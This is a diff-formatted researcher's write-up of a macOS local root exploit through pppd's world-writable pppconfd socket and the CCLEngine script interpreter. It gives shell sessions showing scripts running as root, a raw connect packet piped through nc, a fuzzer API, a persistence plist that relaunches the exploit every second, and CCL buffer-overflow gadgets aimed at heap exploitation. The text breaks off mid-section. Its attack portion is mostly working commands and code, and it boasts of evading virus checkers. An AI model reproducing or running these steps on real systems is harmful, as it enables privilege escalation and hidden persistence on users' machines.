@@ -1,0 +1,1034 @@
+Search for a Sandbox Exploit:
+  Tasked to find a sandbox exploit I used my past experience to decide where to find one. In the past I’ve noticed that many obvious vulnerabilities were included in binary whose source code was mysteriously missing from the apple open source website. So I decided to pull all the open source projects, line count them all, sort them in order of least lines, and find which projects had the most number of files “redacted”. Since I was looking for sandbox I focused on configd since it has tons of critical mach ports, and vpn related programs being redacted. During analysis I noticed there was a RWX unix socket created by pppd at /var/run/pppconfd
+
+===============
+
+Joshuas-Mac:cclpoc posixninja$ ls -al /var/run/pppconfd 
+srwxrwxrwx  1 root  daemon  0 Aug 11 03:01 /var/run/pppconfd
+
+================
+
+Looking through source code, I noticed a number of gems, included methods to shell persist. On execution of pppd as user, it will run a shell script at ~/.pppprc. For user root this file is located at /etc/ppp/options
+
+============== 
+
+Joshuas-Mac:cclpoc posixninja$ ls -al /etc/ppp/options
+-rwxrwxrwx  1 root  wheel  0 Mar 14 18:33 /etc/ppp/options
+
+Joshuas-Mac:cclpoc posixninja$ ls -al ~/.ppprc 
+-rw-r--r--  1 posixninja  staff  26 Aug 11 20:56 /Users/posixninja/.ppprc
+
+Joshuas-Mac:cclpoc posixninja$ ls -al /etc/ppp/options
+-rw-r--r--  1 root  wheel  26 Aug 11 20:56 /etc/ppp/options
+
+Joshuas-Mac:cclpoc posixninja$ cat /etc/ppp/options
+exec /tmp/winning.root.sh
+
+Joshuas-Mac:cclpoc posixninja$ cat ~/.ppprc 
+exec /tmp/winning.user.sh
+
+Joshuas-Mac:cclpoc posixninja$ ls -al /tmp/winning.user.sh 
+-rwxr-xr-x  1 posixninja  wheel  33 Aug 11 20:57 /tmp/winning.user.sh
+
+Joshuas-Mac:cclpoc posixninja$ ls -al /tmp/winning.root.sh 
+-rwxr-xr-x  1 posixninja  wheel  33 Aug 11 20:57 /tmp/winning.root.sh
+
+Joshuas-Mac:cclpoc posixninja$ ls -al /tmp/
+total 16
+drwxrwxrwt  8 root        wheel  272 Aug 11 20:57 .
+drwxr-xr-x@ 6 root        wheel  204 Mar  3 04:00 ..
+drwx------  3 posixninja  wheel  102 Aug 11 03:01 com.apple.launchd.8pzs6mIR8t
+drwx------  3 posixninja  wheel  102 Aug 11 03:01 com.apple.launchd.nik49Hcspv
+drwx------  3 posixninja  wheel  102 Aug 11 03:01 com.apple.launchd.t8WyWhuEdl
+drwxr-xr-x  3 root        wheel  102 Aug 11 18:57 ppp
+-rwxr-xr-x  1 posixninja  wheel   33 Aug 11 20:57 winning.root.sh
+-rwxr-xr-x  1 posixninja  wheel   33 Aug 11 20:57 winning.user.sh
+
+Joshuas-Mac:cclpoc posixninja$ cat /tmp/winning.user.sh 
+#!/bin/bash
+touch /tmp/user.test
+
+Joshuas-Mac:cclpoc posixninja$ cat /tmp/winning.root.sh 
+#!/bin/bash
+touch /tmp/root.test
+
+===============
+
+Since the pppconfd socket is accessible by anyone (RWX) I looked into the protocol in confined and created a fuzzer. The packet format is as follows…
+
+!!!READ!!! All my comments in this file are prefixed by PN, such as…
+/* PN: Please read these carefully. You will be quizzed later. */
+/* PN: You have been warned!! */ /* PN: Some might be at the end of lines, read them all! */
+
+/* local socket path */
+/* PN: This is the famous RWX UNIX socket which we’re sending these bytes into… */
+#define PPP_PATH 	"/var/run/pppconfd\0"
+
+
+/* PN: These structs are cast on top of each other */
+/* PPP message paquets */
+struct ppp_msg_hdr {
+    u_int16_t 		m_flags; 	// special flags
+    u_int16_t 		m_type; 	// type of the message
+    u_int32_t 		m_result; 	// error code of notification message
+    u_int32_t 		m_cookie;	// user param
+    u_int32_t 		m_link;		// link for this message
+    u_int32_t 		m_len;		// len of the following data
+};
+
+struct ppp_msg {
+    u_int16_t 		m_flags; 	// special flags
+    u_int16_t 		m_type; 	// type of the message
+    u_int32_t 		m_result; 	// error code of notification message
+    u_int32_t 		m_cookie;	// user param, or error num for event
+    u_int32_t 		m_link;		// link for this message
+    u_int32_t 		m_len;		// len of the following data
+    u_char 		m_data[1];	// msg data sent or received
+/* PN: Some genius decided to use a character array of 1 to represent a dynamic array!!!
+ * The proper way is to use a size 0 array. The 1 array offsets the structure by 3 bytes
+ * for optimization through the compiler. This causes unaligned structure casting and
+ * can lead to exploitable situations. They used a shitty hack most places to avoid this
+ */
+};
+
+#define PPP_MSG_MAX_DATA_LEN		(64 * 1024)	/* arbitrary limit... 64K */
+#define PPP_MSG_MAX_SERVICEID_LEN	 64			/* arbitrary limit... 64 bytes */
+
+/* codes for ppp messages */
+enum {
+    /* API client commands */
+    PPP_VERSION = 1,
+    PPP_STATUS,
+    PPP_CONNECT, /* PN: This causes pppd to connect as ROOT!!! */
+    PPP_DISCONNECT = 5,
+    PPP_GETOPTION, /* PN: Some of this options are very useful */
+    PPP_SETOPTION, /* PN: Set them here */
+    PPP_ENABLE_EVENT, /* PN: I have not looked into events yet */
+    PPP_DISABLE_EVENT,
+    PPP_EVENT,
+    PPP_GETNBLINKS, /* PN: This is boring */
+    PPP_GETLINKBYINDEX, /* PN: Also boring */
+    PPP_GETLINKBYSERVICEID,
+    PPP_GETLINKBYIFNAME,   /* PN: Yawn */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+    PPP_SUSPEND,/* PN: ?? */
+    PPP_RESUME, /* PN: No clue */
+    PPP_EXTENDEDSTATUS,
+    PPP_GETCONNECTDATA
+};
+
+// flags
+
+/* When USE_SERVICEID is set, m_link contains the serviceID length
+   serviceID string is put after m_len field
+   and m_len still contains the data lenght, excluding serviceID string */
+#define USE_SERVICEID	0x8000 
+
+/* flags specific to the message type. 
+   They will be interpreted differently depending on the type field of the message */
+#define FLAG_TYPE0	0x0001 
+#define FLAG_TYPE1	0x0002 
+#define FLAG_TYPE2	0x0004 
+
+/* PPP_CONNECT message specific flags */
+#define CONNECT_ARBITRATED_FLAG		FLAG_TYPE0	/* connection will be arbitrated with other clients */
+#define CONNECT_AUTOCLOSE_FLAG		FLAG_TYPE1 	/* connection will be disconnected when socket is gone */
+
+/* PPP_DISCONNECT message specific flags */
+#define DISCONNECT_ARBITRATED_FLAG	FLAG_TYPE0	/* disconnection will be arbitrated with other clients */
+
+
+/* macro to access real data base on header flags */
+/* PN: Crappy hack to access the data portion, but it doesn’t even work, lol. They use more hack method later */
+#define MSG_DATAOFF(msg)	(((struct ppp_msg_hdr *)msg)->m_flags & USE_SERVICEID ?                                     ((struct ppp_msg_hdr *)msg)->m_link : 0)
+
+// struct for an option
+/* PN: These are cast onto each other */
+struct ppp_opt_hdr {
+    u_int32_t 		o_type;
+};
+
+struct ppp_opt {
+    u_int32_t 		o_type;
+    u_char 		o_data[1];
+};
+/* PN: Once again, the retarded array of 1 byte which misaligns the entire structure due to compile time optimization!!!! */
+
+/* PN: Options are fun!!! */
+/* codes for options management */
+enum {
+
+    PPP_OPT_DEV_NAME = 1,		// string /* PN: Set this to any tty or pty!! */
+    PPP_OPT_DEV_SPEED,			// 4 bytes
+    PPP_OPT_DEV_CONNECTSCRIPT,		// string /* PN: This CCL script runs on connect!! */
+    
+    PPP_OPT_COMM_IDLETIMER,		// 4 bytes
+    PPP_OPT_COMM_REMOTEADDR,		// string
+
+    PPP_OPT_AUTH_PROTO,			// 4 bytes /* PN: These variables actually get passed into the CCL script */
+    PPP_OPT_AUTH_NAME,			// string /* PN: And this one */
+    PPP_OPT_AUTH_PASSWD,		// string /* PN: And even this one */
+
+    PPP_OPT_LCP_HDRCOMP,		// 4 bytes
+    PPP_OPT_LCP_MRU,			// 4 bytes
+    PPP_OPT_LCP_MTU,			// 4 bytes
+    PPP_OPT_LCP_RCACCM,			// 4 bytes
+    PPP_OPT_LCP_TXACCM,			// 4 bytes
+
+    PPP_OPT_IPCP_HDRCOMP,		// 4 bytes
+    PPP_OPT_IPCP_LOCALADDR,		// 4 bytes
+    PPP_OPT_IPCP_REMOTEADDR,		// 4 bytes
+
+    PPP_OPT_LOGFILE,			// string /* PN: If you want to create a file as root anyone on the filesystem +1 */
+    PPP_OPT_RESERVED,			// 4 bytes
+    PPP_OPT_COMM_REMINDERTIMER,		// 4 bytes 
+    PPP_OPT_ALERTENABLE,		// 4 bytes 
+
+    PPP_OPT_LCP_ECHO,			// struct ppp_opt_echo 
+
+    PPP_OPT_COMM_CONNECTDELAY,		// 4 bytes
+    PPP_OPT_COMM_SESSIONTIMER,		// 4 bytes
+    PPP_OPT_COMM_TERMINALMODE,		// 4 bytes
+    PPP_OPT_COMM_TERMINALSCRIPT,	// string. Additionnal connection script, once modem is connected /* PN: This is where our payload goes!! */
+    PPP_OPT_RESERVED1,			// place holder
+
+    PPP_OPT_RESERVED2,			// place holder
+    PPP_OPT_DEV_CONNECTSPEED,		// 4 bytes, actual connection speed
+    PPP_OPT_SERVICEID,			// string, name of the associated service in the cache
+    PPP_OPT_IFNAME,			// string, name of the associated interface (ppp0, ...) /* PN: Oh yea we can also create new network interfaces… */
+    
+    PPP_OPT_DEV_DIALMODE,		// 4 bytes, dial mode, applies to modem connection
+    PPP_OPT_DIALONDEMAND		// 4 bytes, is service configured for DialOnDemand ? /* PN: If set this causes it to redial if it’s not connected */
+};
+
+// options values
+
+// PPP_LCP_OPT_HDRCOMP -- option ppp addr/ctrl compression
+enum {
+    PPP_LCP_HDRCOMP_NONE = 0,
+    PPP_LCP_HDRCOMP_ADDR = 1,
+    PPP_LCP_HDRCOMP_PROTO = 2
+};
+
+enum {
+    PPP_COMM_TERM_NONE = 0,
+    PPP_COMM_TERM_SCRIPT, /* PN: We just want a script to run */
+    PPP_COMM_TERM_WINDOW
+};
+
+enum {
+    PPP_ALERT_ERRORS = 2,		// disconnection causes
+    PPP_ALERT_PASSWORDS = 8,		// password and CCL Ask
+    
+    PPP_ALERT_DISABLEALL = 0,
+    PPP_ALERT_ENABLEALL = 0xFFFFFFFF
+};
+
+
+enum {
+    PPP_IPCP_HDRCOMP_NONE = 0,
+    PPP_IPCP_HDRCOMP_VJ
+};
+
+// PPP_LCP_OPT_RCACCM -- option receive control asynchronous character map
+enum {
+    PPP_LCP_ACCM_NONE = 0,
+    PPP_LCP_ACCM_XONXOFF = 0x000A0000,
+    PPP_LCP_ACCM_ALL = 0xFFFFFFFF
+};
+
+// PPP_OPT_AUTH
+enum {
+    PPP_AUTH_NONE = 0, /* PN: Fuck Auth */
+    PPP_AUTH_PAPCHAP,
+    PPP_AUTH_PAP,
+    PPP_AUTH_CHAP
+};
+
+// PPP_OPT_DEV_DIALMODE
+enum {
+    PPP_DEV_WAITFORDIALTONE = 0,
+    PPP_DEV_IGNOREDIALTONE,
+    PPP_DEV_MANUALDIAL /* PN: We’ll send our own DTMF tones thank you very much */
+};
+
+// state machine
+enum {
+    PPP_IDLE = 0,
+    PPP_INITIALIZE,
+    PPP_CONNECTLINK,
+    PPP_STATERESERVED,
+    PPP_DORMANT=3,
+    PPP_ESTABLISH=4,
+    PPP_AUTHENTICATE,
+    PPP_CALLBACK,
+    PPP_NETWORK,
+    PPP_RUNNING,
+    PPP_TERMINATE,
+    PPP_DISCONNECTLINK,
+    PPP_HOLDOFF,
+    PPP_ONHOLD,
+    PPP_WAITONBUSY,
+	PPP_WAITING
+};
+
+// events
+enum {
+    PPP_EVT_DISCONNECTED = 1,
+    PPP_EVT_CONNSCRIPT_STARTED,
+    PPP_EVT_CONNSCRIPT_FINISHED,
+    PPP_EVT_TERMSCRIPT_STARTED,
+    PPP_EVT_TERMSCRIPT_FINISHED,
+    PPP_EVT_LOWERLAYER_UP,
+    PPP_EVT_LOWERLAYER_DOWN,
+    PPP_EVT_LCP_UP,
+    PPP_EVT_LCP_DOWN,
+    PPP_EVT_IPCP_UP,
+    PPP_EVT_IPCP_DOWN,
+    PPP_EVT_AUTH_STARTED,
+    PPP_EVT_AUTH_FAILED,
+    PPP_EVT_AUTH_SUCCEDED,
+    PPP_EVT_CONN_STARTED,
+    PPP_EVT_CONN_FAILED,
+    PPP_EVT_CONN_SUCCEDED,
+    PPP_EVT_DISC_STARTED,
+    PPP_EVT_DISC_FINISHED,
+    PPP_EVT_STOPPED,
+    PPP_EVT_CONTINUED,
+    PPP_EVT_REQUEST_INSTALL,
+    PPP_EVT_REQUEST_UNINSTALL,
+};
+
+struct ppp_opt_echo {		// 0 for the following value will cancel echo option
+    u_int16_t 	interval;	// delay in seconds between echo requests
+    u_int16_t 	failure;	// # of failure before declaring the link down
+};
+
+struct ppp_status {
+    // connection stats
+    u_int32_t 		status;
+    union {
+        struct connected {
+            u_int32_t 		timeElapsed;
+            u_int32_t 		timeRemaining;
+            // bytes stats
+            u_int32_t 		inBytes;
+            u_int32_t 		inPackets;
+            u_int32_t 		inErrors;
+            u_int32_t 		outBytes;
+            u_int32_t 		outPackets;
+            u_int32_t 		outErrors;
+        } run;
+        struct disconnected {
+            u_int32_t 		lastDiscCause;
+        } disc;
+        struct waitonbusy {
+            u_int32_t 		timeRemaining;
+        } busy;
+    } s;
+};
+
+enum {
+    // from 0 to 255, we use bsd error codes from errno.h
+    
+    // ppp speficic error codes
+    PPP_ERR_GEN_ERROR	= 256,
+    PPP_ERR_CONNSCRIPTFAILED,
+    PPP_ERR_TERMSCRIPTFAILED,
+    PPP_ERR_LCPFAILED,
+    PPP_ERR_AUTHFAILED,
+    PPP_ERR_IDLETIMEOUT,
+    PPP_ERR_SESSIONTIMEOUT,
+    PPP_ERR_LOOPBACK,
+    PPP_ERR_PEERDEAD,
+    PPP_ERR_DISCSCRIPTFAILED,
+    PPP_ERR_DISCBYPEER,
+    PPP_ERR_DISCBYDEVICE,
+    PPP_ERR_NODEVICE,
+    
+    // modem specific error codes
+    PPP_ERR_MOD_NOCARRIER	= 512,
+    PPP_ERR_MOD_BUSY,
+    PPP_ERR_MOD_NODIALTONE,
+    PPP_ERR_MOD_ERROR,
+    PPP_ERR_MOD_HANGUP,
+    PPP_ERR_MOD_NOANSWER,
+    PPP_ERR_MOD_NONUMBER,
+    PPP_ERR_MOD_BADSCRIPT
+};
+
+QUIZ:
+ How can we use this to gain root code execution?
+
+Answer:
+ If we set the connect script and trigger the connect packet it will execute as root.
+      (Also acceptable, write to /etc/ppp/options, if root is already obtained)
+
+But Wait there’s more!!:
+  These are not the only options which can configure pppd. There’s many other options in configd. Installing these is as easy as double clicking on a plist file.Seriously, you just need to export the configuration, it exports it to the plist file. And even then there’s more goodies which can be added no accessible from the gui. I have included the fuzzer and interface I used to interact with pppconfd called pppconfuzzno just once
+. The API is fairly simple and looks like
+
+========
+
+    printf("Connecting to pppconfd socket\n");
+    gFd = ppp_connect();
+    
+    printf("Getting number of links\n");
+    send_ppp_msg(create_msg(PPP_GETNBLINKS));
+    
+    printf("Getting device name option\n");
+    ppp_get_option(PPP_OPT_DEV_NAME); /* PN: The serial device we’re connecting to */
+    
+    printf("Setting device name option\n");
+    ppp_set_option_str(PPP_OPT_DEV_NAME, "/dev/cu.serial1"); /* PN: We can assign this to any tty or pty */
+    
+    printf("Getting device name option\n");
+    ppp_get_option(PPP_OPT_DEV_NAME); /* PN: Check that it changed */
+
+    printf("Getting connection script option\n");
+    ppp_get_option(PPP_OPT_DEV_CONNECTSCRIPT); /* PN: Check which connect script it specified */
+    
+    //printf("Setting connect script option\n");
+    ppp_set_option_str(PPP_OPT_DEV_CONNECTSCRIPT, “/tmp/pwn.ccl"); /* PN: Set it to our exploit script */
+    
+    printf("Getting connection script option\n");
+    ppp_get_option(PPP_OPT_DEV_CONNECTSCRIPT); /* PN: Make sure it changed */
+    
+    printf("Getting terminal script option\n");
+    ppp_get_option(PPP_OPT_COMM_TERMINALSCRIPT); /* PN: Do the same for terminal script */
+    
+    printf("Setting terminal script option\n");
+    ppp_set_option_str(PPP_OPT_COMM_TERMINALSCRIPT, “/tmp/test.ccl");
+    
+    printf("Getting terminal script option\n");
+    ppp_get_option(PPP_OPT_COMM_TERMINALSCRIPT);
+    
+    printf("Connecting to pppd\n");
+    send_ppp_msg(create_msg(PPP_CONNECT)); /* PN: Here we trigger the connection as root!!! */
+    // "\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" /* PN: This is the hex of the connect packet */
+    printf("Shutting down socket\n");
+    ppp_shutdown(gFd);
+
+==========
+
+The program is nice and can be used, however it would depend on a self-signed program to execute the LPE. Luckily BSD netcat can be our friend. Netcat (NC) is shipped by default on all macOS systems and is signed by Apple. Nice thing about BSD nc is it include the option to connect to UNIX sockets. So with a simple command line we can also trigger the LPE using apple’s own software
+
+==========
+
+Joshuas-Mac:cclpoc posixninja$ echo -e "\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" | nc -U /var/run/pppconfd
+Joshuas-Mac:cclpoc posixninja$ ls -al /tmp/
+total 16
+drwxrwxrwt  9 root        wheel  306 Aug 11 21:21 .
+drwxr-xr-x@ 6 root        wheel  204 Mar  3 04:00 ..
+drwx------  3 posixninja  wheel  102 Aug 11 03:01 com.apple.launchd.8pzs6mIR8t
+drwx------  3 posixninja  wheel  102 Aug 11 03:01 com.apple.launchd.nik49Hcspv
+drwx------  3 posixninja  wheel  102 Aug 11 03:01 com.apple.launchd.t8WyWhuEdl
+drwxr-xr-x  3 root        wheel  102 Aug 11 18:57 ppp
+-rw-r--r--  1 root        wheel    0 Aug 11 21:21 root.test
+-rwxr-xr-x  1 posixninja  wheel   33 Aug 11 20:57 winning.root.sh
+-rwxr-xr-x  1 posixninja  wheel   33 Aug 11 20:57 winning.user.sh
+ 
+Joshuas-Mac:cclpoc posixninja$ cat /tmp/ppp/ppp.log 
+Fri Aug 11 18:57:11 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 18:57:11 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 18:57:12 2017 : Apple Base Script.ccl Version 3.3
+Fri Aug 11 18:57:12 2017 : CCLWrite : AT\13
+Fri Aug 11 18:57:15 2017 : CCLWrite : AT\13
+Fri Aug 11 18:57:19 2017 : CCLWrite : AT\13
+Fri Aug 11 18:57:22 2017 : Modem error; the modem is not responding.
+Fri Aug 11 18:57:22 2017 : CCLExit: -6019 (Modem error, modem not responding.)
+Fri Aug 11 18:57:22 2017 : Connect script failed
+Fri Aug 11 18:58:11 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 18:58:11 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 18:58:12 2017 : Apple Base Script.ccl Version 3.3
+Fri Aug 11 18:58:12 2017 : CCLWrite : AT\13
+Fri Aug 11 18:58:16 2017 : CCLWrite : AT\13
+Fri Aug 11 18:58:19 2017 : CCLWrite : AT\13
+Fri Aug 11 18:58:22 2017 : Modem error; the modem is not responding.
+Fri Aug 11 18:58:22 2017 : CCLExit: -6019 (Modem error, modem not responding.)
+Fri Aug 11 18:58:22 2017 : Connect script failed
+Fri Aug 11 18:59:25 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 18:59:25 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 18:59:26 2017 : Apple Base Script.ccl Version 3.3
+Fri Aug 11 18:59:26 2017 : CCLWrite : AT\13
+Fri Aug 11 18:59:29 2017 : CCLWrite : AT\13
+Fri Aug 11 18:59:33 2017 : CCLWrite : AT\13
+Fri Aug 11 18:59:36 2017 : Modem error; the modem is not responding.
+Fri Aug 11 18:59:36 2017 : CCLExit: -6019 (Modem error, modem not responding.)
+Fri Aug 11 18:59:36 2017 : Connect script failed
+Fri Aug 11 19:00:07 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 19:00:07 2017 : publish_entry SCDSet() failed: Success!
+Fri Aug 11 19:00:08 2017 : Apple Base Script.ccl Version 3.3
+Fri Aug 11 19:00:08 2017 : CCLWrite : AT\13
+Fri Aug 11 19:00:12 2017 : CCLWrite : AT\13
+
+
+=============
+
+Here you see it attempting to connect with the default CCL script “Apple Base Script.ccl”. The /etc/pppd/options file was executed though, and the shell script pointed to was executed and created /tmp/root.test with root privileges. This adds persistence to the vulnerability in a way which no current virus checker detects. 
+
+
+An example of the plist file to inject the vulnerability.
+
+==================
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>MODEM</key>
+	<dict>
+		<key>SystemConfig</key>
+		<dict>
+			<key>PPP</key>
+			<dict>
+				<key>ACSPEnabled</key>
+				<integer>0</integer>
+
+				<key>AuthName</key>
+				<string></string>
+				<key>AuthPrompt</key>
+				<string>Before</string>
+				<key>CommDisplayTerminalWindow</key>
+				<integer>1</integer>
+				<key>CommRedialCount</key>
+				<integer>1</integer>
+				<key>CommRedialEnabled</key>
+				<integer>1</integer>
+				<key>CommRedialInterval</key>
+				<integer>5</integer>
+				<key>CommRemoteAddress</key>
+				<string></string>
+				<key>CommTerminalScript</key>
+				<string>/tmp/win.ccl</string>
+				<key>CommUseTerminalScript</key>
+				<integer>1</integer>
+
+				<key>DialOnDemand</key>
+				<integer>1</integer>
+				<key>DisconnectOnFastUserSwitch</key>
+				<integer>1</integer>
+				<key>DisconnectOnIdle</key>
+				<integer>1</integer>
+				<key>DisconnectOnIdleTimer</key>
+				<integer>1</integer>
+				<key>DisconnectOnLogout</key>
+				<integer>1</integer>
+				<key>DisconnectOnSleep</key>
+				<integer>1</integer>
+				<key>IPCPCompressionVJ</key>
+				<integer>1</integer>
+				<key>IdleReminder</key>
+				<integer>0</integer>
+				<key>IdleReminderTimer</key>
+				<integer>1800</integer>
+				<key>LCPEchoEnabled</key>
+				<integer>1</integer>
+				<key>LCPEchoFailure</key>
+				<integer>4</integer>
+				<key>LCPEchoInterval</key>
+				<integer>10</integer>
+				<key>Logfile</key>
+				<string>/AppleInternal/ppp/log</string>
+				<key>VerboseLogging</key>
+				<integer>0</integer>
+			</dict>
+		</dict>
+	</dict>
+</dict>
+</plist>
+
+==================
+
+Rename this to .networkConnect file and you have access to all these config settings and more. This plist once double clicked should install a serial modem connection which is triggered every second, or whenever the computer wakes up from sleep. Also it creates a log file located at /.AppleInternal which is often check for existence to enable other apple debug code paths. If exploit reliability is low, this can continue to relaunch the exploit until success.
+
+Other ways to alter these network settings and inject this vulnerability include possibility to alter configd directly, or by altering the system preference file manually (it’s owned by root so getting configd to do it is easier).
+
+These CCL scripts are well documented by apple and include a very nice interactive scripting language for communicating with serial devices.
+
+https://developer.apple.com/library/content/documentation/HardwareDrivers/Reference/CCLScriptingRef/Introduction/Introduction.html
+
+I’ve included a simple CCL script fuzzer program I’ve written, however I never got to run it, so it might not work well. I wanted to attempt the most obvious bug first. Check and see if using multiple long varStrings could overflow the script buffer. The varStrings are held in multiple areas, including the Info.plist of the CCL script bundle. The bundles are similar to the layout of an application bundle, and it even appears to have a code signature. However this signature is never checked and the file is loaded in as a plaintext file. Here are the commands allowed.
+
+==========
+
+char	*Commands[] =
+{
+    "!\0",			//  1 /
+    "@CCLSCRIPT\0",		//  2 /
+    "@ORIGINATE\0",		//  3 /
+    "@ANSWER\0",		//  4 /
+    "@HANGUP\0",		//  5 /
+    "@LABEL\0",			///  6 /
+    "ASK\0",			//  7 /
+    "CHRDELAY\0",		//  8 /
+    "COMMUNICATINGAT\0",	//  9 /
+    "DECTRIES\0",		// 10 /
+    "DTRSET\0",			// 11 /
+    "DTRCLEAR",			// 12 /
+    "EXIT",			// 13 /
+    "FLUSH",			// 14 /
+    "HSRESET",			// 15 /
+    "IFANSWER",			// 16 /
+    "IFORIGINATE",		// 17 /
+    "IFSTR",			// 18 /
+    "IFTRIES",			// 19 /
+    "INCTRIES",			// 20 /
+    "JUMP",			// 21 /
+    "JSR",			// 22 /
+    "LBREAK",			// 23 /
+    "LOGMSG",			// 24 /		// undocumented.  use cNote.  KW
+    "MATCHCLR",			// 25 /
+    "MATCHREAD",		// 26 /
+    "MATCHSTR",			// 27 /
+    "NOTE",			// 28 /
+    "PAUSE",			// 29 /
+    "RETURN",			// 30 /
+    "SBREAK",			// 31 /
+    "SERRESET",			// 32 /
+    "SETSPEED",			// 33 /
+    "SETTRIES",			// 34 /
+    "USERHOOK",			// 35 /
+    "WRITE",			// 36 /
+    "MONITORLINE",		// 37 /
+    "DEBUGLEVEL"		// 38 /
+};
+
+================
+
+Within the CCLEngine there are a few commands which overflow by using these large varStrings, I’ve listed a few below
+
+==============
+
+     ^27 = varString 27 which contains 254 bytes of ‘A’
+
+WRITE ^27^27 /* PN: overwrite the end of the “SV” global variable */
+NOTE ^27^27 /* PN: Classic stack buffer overflow, but it hits stack cookie */
+MATCHSTR ^27^27 /* PN: Also stack buffer overflow that hits cookie */
+
+==========
+
+The global SV structure is quite interesting to I focused a bit on that
+
+===============
+
+typedef struct TRScriptVars
+{
+	unsigned short	ctlFlags;		// CCL control flags
+	u_int32_t	serialSpeed;		/* the last speed the serial driver was set to	*/
+	char		maskStringId;		/* varString subject to bullet masking	*/
+	unsigned char	maskStart;		/* starting mask character position		*/
+	unsigned char	maskStop;		/* stopping mask character position		*/
+	short		theAbortErr;		/* result code for the abort			*/
+	unsigned char	modemReliability;	/* type of reliability negotiated by modem	*/
+	unsigned char	modemCompression;	/* type of compression negotiated by modem	*/
+	void		*commands;		// ptr to ccl commands
+	short		answerLine;		// index to answer entry
+	short		originateLine;		// index to originate entry
+	short		hangUpLine;		// index to hangUp entry
+	u_int32_t	pauseTimer;		// Value of the pause timer
+	u_int32_t	chrDelayValue;		// character delay value
+	u_int8_t	*script;		// ptr to CCL script
+	u_int8_t	scriptPrepped;		// true if PrepScript has been called
+	u_int8_t	scriptPrepFailed;	// true if PrepScript fails; used in Connect/Disconnect.
+	u_int32_t	scriptAllocSize;	// byte size of allocation for CCL script
+	u_int32_t	scriptSize;		// byte size of CCL script
+	u_int16_t	lineCount;		// number of lines in the script
+	u_int16_t	*indexTable;		// ptr to script line index table
+	u_int16_t	scriptLineIndex;	// index into current script line
+	u_int16_t	scriptLine;		// index to current script line
+	u_int8_t	*scriptLinePtr;		// pointer to current script line
+	u_int8_t	scriptLineSize;		// size, in bytes of current script line
+	u_int32_t	loopCounter;		// just what you think it is
+	short		labels[MAXLABELS];	// script line indices for labels
+	TRMatchStrInfo	matchStr[ maxMatch];	// match string information for each match string
+	u_int8_t	strBuf[256];		// buffer used for temorary string storage
+	u_int16_t	askLabel;		// label to jump to if user cancels ask dialog
+        ushort		stack[cclNestingLimit];	// stack used for subroutine jumps
+        u_int32_t	topOfStack;		// index of top of stack
+	u_int8_t	writeBufIndex;		// index into current write request
+	u_int8_t	logMaskOn;		// tells whether to mask sensitive varString text when logging
+} TRScriptVars, *TPScriptVars;
+
+============
+
+The overflow takes place in strBuf[256]. After the overflow that we can overwrite askLabel, stack, topOfStack, writeBufIndex, and logMaskOn. There are also a few other values following this structure which can be altered. The main ones I focused on was the SV.stack[] and SV.topOfStack.
+
+============
+
+            case cJSR:
+                if (SV.topOfStack == 0) {
+                    running = 0;
+                    SV.ctlFlags &= ~cclPlaying;
+                    SV.theAbortErr = cclErr_SubroutineOverFlow;	// for WrapScript()->ScriptComplete().
+                    terminate(cclErr_SubroutineOverFlow);
+                }
+                else {
+                    SV.stack[--SV.topOfStack] = SV.scriptLine;	// save return line
+                    NextInt(&i);
+                    SV.scriptLine = SV.labels[i - 1];
+                }
+                break;
+
+
+            case cReturn:
+                if (SV.topOfStack == cclNestingLimit) {
+                    running = 0;
+                    SV.ctlFlags &= ~cclPlaying;
+                    SV.theAbortErr = cclErr_SubroutineOverFlow;	// for WrapScript()->ScriptComplete().
+                    terminate(cclErr_SubroutineOverFlow);
+                }
+                else
+                    SV.scriptLine = SV.stack[SV.topOfStack++];
+                break;
+
+=============
+
+Between these 2 commands, if I can control values in the stack array and the value of the top of stack, The engine only checks that the value is not equal to 16 and it’s not equal to 0. If I alter the topOfStack value to be something much higher I achieve a 2 byte (short) read and write primitives to any higher address. The value I’m reading or writing to this offset is determined by the current script line in the program though. To solve this problem I created a PERL script which will generate the CCL script combining different gadgets to generate a secondary weird machine utilizing their own system. What’s still needed is a way to use the read and write primitives to gain code execution. For that I decided to focus on one nice interesting structure included in CCLEngine
+
+============
+
+struct	callout {
+    struct timeval	c_time;		/* time at which to call routine */
+    void		*c_arg;		/* argument to routine */
+    void		(*c_func)(void *); /* routine */
+    struct		callout *c_next;
+};
+
+=============
+
+This structure basically just takes a function pointer and an argument to pass into the function as well as a linked list to the next callout to make. This structure is used in the read/write loop to handle timeouts waiting for information from the serial device, or so sending characters to the serial device slowly. Nice think about this structure is it’s allocated and deallocated rapidly sort should make for a nice target if we can overwrite the function pointer or the next entry in heap. First we need to find it in heap though, which is a challenge by itself.
+
+< document >
+
+
+
+There wes much strange behavior, but nothing concrete like a crash report. Attempting to send commands manually, I noticed when I sent a connect command to the pppconfd socket it would run pppd as root. There were many other interesting commands, such as setting a “connect script” and “disconnect” script. I came to found these were referring to “CCL” scripts. “Carrier Configuration Language”? This decide the behavior of connection to serial line modems. This code has been around since before MacOSX existed. The source code even users pascal scripts as proof of it’s age.
+
+
+CCLEngine:
+  I decided to create a new buzzer for the application pppd was calling, an app called CCLEngine. After creating the fuzzer I decided to go ahead and try to most obvious vulnerability I could think of. A variable substitution overflow. I worked. However the memory values I could overflow were limited because it was in global scope.After evaluation all the values I could overwrite I gained a few gadgets. One was a read anywhere, (limited) the other was a write anywhere (limited). What I needed was an execute anywhere primitive.
+
+LibSystem Malloc
+
+After finding an array out of bounds write vulnerability in a global array, I decided to attempt exploitation by abusing the heap metadata structures.
+
+ My first attempt were to overwrite parts of szone_t. 
+
+=============
+
